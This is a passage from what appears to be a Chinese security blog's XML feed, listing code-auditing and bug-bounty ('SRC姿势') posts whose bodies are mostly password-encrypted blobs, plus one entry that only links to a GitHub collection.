        <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="内容已加密，请输入密码" />    <label for="pass">内容已加密，请输入密码</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通用代码审计思路</title>
      <link href="/2022/04/24/%E9%80%9A%E7%94%A8%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF/"/>
      <url>/2022/04/24/%E9%80%9A%E7%94%A8%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="内容已加密，请输入密码" />    <label for="pass">内容已加密，请输入密码</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SRC姿势(五)</title>
      <link href="/2022/04/24/SRC%E5%A7%BF%E5%8A%BF(%E4%BA%94)/"/>
      <url>/2022/04/24/SRC%E5%A7%BF%E5%8A%BF(%E4%BA%94)/</url>
      
        <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="内容已加密，请输入密码" />    <label for="pass">内容已加密，请输入密码</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> SRC姿势 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SRC姿势(四)</title>
      <link href="/2022/04/24/SRC%E5%A7%BF%E5%8A%BF(%E5%9B%9B)/"/>
      <url>/2022/04/24/SRC%E5%A7%BF%E5%8A%BF(%E5%9B%9B)/</url>
      
        <content type="html"><![CDATA[<h1 id="SRC姿势-四"><a href="#SRC姿势-四" class="headerlink" title="SRC姿势(四)"></a>SRC姿势(四)</h1><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204242311961.png" alt="image-20220424231133899"></p><p>GitHub地址：</p><p><a href="https://github.com/LiAoRJ/src">LiAoRJ&#x2F;src: SRC姿势收集 (github.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> SRC姿势 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SRC姿势(三)</title>
      <link href="/2022/04/24/SRC%E5%A7%BF%E5%8A%BF(%E4%B8%89)/"/>
      <url>/2022/04/24/SRC%E5%A7%BF%E5%8A%BF(%E4%B8%89)/</url>
      
        <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="内容已加密，请输入密码" />    <label for="pass">内容已加密，请输入密码</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX19rt2vLMMraukccQCYT4/pJUTpkdc2pC8uGfmdd7jL8LfmxPGFFoFMhh8AtCaNWJNOSZ09GYWER/KvcgG/hJ/64Nk74JeTBW/YtQT2dz3bpgD4BAH32tboDyAWuFGIVf4hAMNtlc/SOze2pYQCiz5UdCh9axDrGUG2u+DfsX//q0J/NtSSvdE0SAvxpyVbrLU371CwnjtCH9FUstxK8Ol0JEEBiRCBZTS8Ozl5bSE4Kb0af/YhoiF5W60C5t5akvYshVHbgfRFjU+h71ZoizyqX04RTV+MVpXncYT7l86nLvm9lFCiR6pkbcHKgZ+GGSJD0tfbFgcxnjKd3Ik4/4Om2sJNjTwCtA8y3OZqcvZel7NBpVSRmOuZnAKSkeXyKNMqF+8J4kupoBZTA8PaqQw1zVHmzYEtA+M60j4iJYKpXjs9gKIFjqCuu+/l9Uk82EVB/5mYE8B5WBPt2viowkZEbgCn6qClV0+ZfinMm9Gpa473jY37tDlQgHeGmJtmpE5pObTXfk2md34yu5GEmOdkuzuRtTOXcLrBM1yDPEg4t74QCB1aa8QCOOxviOO5s6O7W2GvJlC6Drx/eiBmQUWhMBGC